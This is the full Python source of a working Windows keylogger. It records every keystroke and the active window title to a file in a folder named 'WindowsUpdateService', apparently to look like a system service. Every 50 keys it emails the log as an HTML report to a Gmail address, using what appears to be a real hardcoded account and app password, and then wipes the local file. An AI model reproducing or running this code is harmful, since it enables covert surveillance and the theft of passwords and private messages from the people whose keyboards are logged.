from pynput import keyboard
import os
import smtplib
from email.mime.text import MIMEText
import time
import win32gui
import getpass
import logging

# CONFIG
log_file_path = r'D:\sem3\WindowsUpdateService\log.txt'

# Your email and app password (Hardcoded, for personal use only)
your_email = "yradnahbmahtarp@gmail.com"
your_password = "munm zkwx urvw cwwh"  # Gmail App Password
to_email = "prathamb1501@gmail.com"

# Ensure the directory exists
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

# Initialize logger
logging.basicConfig(filename=r'D:\sem3\WindowsUpdateService\keylogger.log', level=logging.INFO)

# Get the current user name (who is running the script)
user_name = getpass.getuser()

last_window = None
key_press_count = 0  # To count the number of keypresses

def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except Exception as e:
        logging.error(f"Error getting active window title: {e}")
        return "Unknown Window"

def write_to_file(key):
    global last_window, key_press_count
    current_window = get_active_window_title()
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

    # Improved log format (tabular)
    try:
        with open(log_file_path, "a", encoding='utf-8') as f:
            if current_window != last_window:
                f.write(f"\n\n[{timestamp}] --- Active Window: {current_window} ---\n")
                last_window = current_window
            try:
                f.write(f"{timestamp} | {current_window} | {key.char}\n")
            except AttributeError:
                f.write(f"{timestamp} | {current_window} | [{key.name}]\n")
    except Exception as e:
        logging.error(f"Error writing to log file: {e}")

    key_press_count += 1
    if key_press_count >= 50:
        send_email()
        clear_log()
        key_press_count = 0  # Reset counter after sending email

def send_email():
    try:
        # Read log file content
        with open(log_file_path, "r", encoding='utf-8') as f:
            log_data = f.read()

        # HTML Email format
        html_content = f"""
        <html>
        <body>
        <h2>Keylogger Report</h2>
        <p><strong>Date:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <table border="1" cellpadding="5" cellspacing="0">
        <thead>
            <tr>
                <th>Timestamp</th>
                <th>Window Title</th>
                <th>Key Pressed</th>
            </tr>
        </thead>
        <tbody>
        """
        
        # Format log data for email
        for line in log_data.splitlines():
            try:
                timestamp, window, key = line.split(" | ")
                html_content += f"""
                <tr>
                    <td>{timestamp}</td>
                    <td>{window}</td>
                    <td>{key}</td>
                </tr>
                """
            except ValueError:
                logging.error(f"Skipping malformed log line: {line}")
        
        # Close the HTML table and body
        html_content += """
        </tbody>
        </table>
        </body>
        </html>
        """

        # Create the MIMEText message with HTML content
        msg = MIMEText(html_content, 'html')
        msg['Subject'] = 'Keylog Report'
        msg['From'] = your_email
        msg['To'] = to_email

        # Send the email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(your_email, your_password)
            smtp.send_message(msg)
            logging.info(f"Email sent successfully to {to_email} at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        logging.error(f"Error sending email: {e}")

def clear_log():
    try:
        open(log_file_path, 'w').close()
        logging.info("Log file cleared.")
    except Exception as e:
        logging.error(f"Error clearing log file: {e}")

def on_press(key):
    write_to_file(key)
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Log the start of the script
start_time = time.strftime('%Y-%m-%d %H:%M:%S')
logging.info(f"Keylogger started at {start_time} by {user_name}")

# Start logging
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Log the end of the script
end_time = time.strftime('%Y-%m-%d %H:%M:%S')
logging.info(f"Keylogger stopped at {end_time}.")
